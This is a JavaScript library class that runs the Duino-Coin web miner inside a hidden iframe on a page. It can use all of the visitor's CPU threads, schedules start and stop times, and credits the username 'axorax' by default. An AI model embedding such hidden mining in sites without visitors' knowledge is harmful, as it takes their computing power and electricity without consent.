export class Duco {

    constructor (options) {
        this.username = options.username || 'axorax';
        this.threads = String(options.threads).toLowerCase()=='hardwareconcurrency'?window.navigator.hardwareConcurrency:options.threads||1;
        this.rigid = options.rigid || 'duco.js';
        this.key = options.key || '';
        this.id = options.id || ('duco-js-' + String(Math.random().toString(36).slice(2, 12)));
        this.createdTimestamp = new Date();
        this.startedTimestamp = null;
        this.stoppedTimestamp = null;
        this.running = false;
        this.changed = false;
        this.url = `https://server.duinocoin.com/webminer.html?username=${this.username}&threads=${this.threads}&rigid=${this.rigid}&keyinput=${this.key}`;
    }

    start() {
        const iframe = document.createElement('iframe');
        iframe.src = this.url;
        iframe.id = this.id;
        iframe.style.cssText = 'display:none;';
        document.body.append(iframe);
        this.running = true;
        this.startedTimestamp = new Date();
    }

    startAfter(time) {
        setTimeout(() => {
            this.start();
        }, time)
    }

    stop() {
        document.querySelectorAll(`#${this.id}`).forEach(e=>e.remove());
        this.running = false;
        this.stoppedTimestamp = new Date();
    }

    stopAfter(time) {
        setTimeout(() => {
            this.stop();
        }, time)
    }

    addStyle(style) {
        document.querySelectorAll(`#${this.id}`).forEach(e=>e.style.cssText=style);
    }

    change(options) {
        this.username = options.username || this.username;
        this.threads = String(options.threads).toLowerCase()=='hardwareconcurrency'?window.navigator.hardwareConcurrency:options.threads||this.threads;
        this.rigid = options.rigid || this.rigid;
        this.key = options.key || this.key;
        this.id = options.id || this.id;
        this.url = `https://server.duinocoin.com/webminer.html?username=${this.username}&threads=${this.threads}&rigid=${this.rigid}&keyinput=${this.key}`;
        this.changed = true;
        this.stop();
        if (options.start) this.start();
    }

    changeAfter(options, time) {
        setTimeout(() => {
            this.change(options);
        }, time)
    }
}

export default Duco;